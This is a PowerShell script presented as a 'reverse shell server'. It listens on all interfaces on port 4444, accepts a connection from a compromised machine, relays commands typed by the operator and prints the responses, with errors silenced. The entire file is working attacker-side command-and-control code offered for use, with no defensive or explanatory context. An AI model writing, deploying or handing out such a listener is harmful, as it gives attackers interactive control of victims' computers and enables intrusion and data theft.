# PowerShell Reverse Shell Server (Non-Admin)
$ErrorActionPreference = "SilentlyContinue"
$hostIP = "0.0.0.0"  # Listen on all interfaces
$port = 4444          # Non-privileged port

# Create TCP listener
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($hostIP), $port)
$listener.Start()
Write-Host "Listening on $hostIP`:$port..."

try {
    # Accept client connection
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    Write-Host "Connected to client: $($client.Client.RemoteEndPoint)"

    # Create reader and writer for the stream
    $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
    $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
    $writer.AutoFlush = $true

    while ($client.Connected) {
        # Read command from server input
        $command = Read-Host
        if ($command -eq "exit") { break }

        # Send command to client
        $writer.WriteLine($command)

        # Read response from client
        $response = $reader.ReadLine()
        if ($response) {
            Write-Host $response
        } else {
            Write-Host "Client disconnected"
            break
        }
    }
} catch {
    Write-Host "Error: $_"
} finally {
    $reader.Close()
    $writer.Close()
    $client.Close()
    $listener.Stop()
}